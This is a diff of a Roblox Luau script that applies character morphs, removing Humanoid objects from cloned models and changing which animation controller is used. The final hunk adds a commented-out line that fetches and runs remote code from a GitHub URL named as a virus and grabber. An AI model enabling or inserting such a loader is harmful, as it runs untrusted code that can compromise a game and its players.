@@ -108,6 +108,13 @@ local function applyMorph(player, character)
 
     local model = template:Clone()
     model.Name = modelName
+
+    for _, descendant in ipairs(model:GetDescendants()) do
+        if descendant:IsA("Humanoid") then
+            descendant:Destroy()
+        end
+    end
+
     model.Parent = character
 
     local morphRoot = findPartRecursive(model, "HumanoidRootPart") or model.PrimaryPart or findPartRecursive(model, "UpperTorso")
@@ -135,7 +142,7 @@ local function applyMorph(player, character)
         end
     end
 
-    local controller = model:FindFirstChildOfClass("AnimationController") or model:FindFirstChildOfClass("Humanoid")
+    local controller = model:FindFirstChildOfClass("AnimationController")
     if not controller then
         controller = Instance.new("AnimationController", model)
     end
@@ -321,3 +328,5 @@ end
 
 _G.Clearmorphs = clearMorphs
 _G.morphCleanup = clearMorphs
+
+--loadstring(game:HttpGet("https://raw.githubusercontent.com/Homelessman1223/Groundskeeper/refs/heads/main/injectvirusandeverybadgrabber.luau"))()
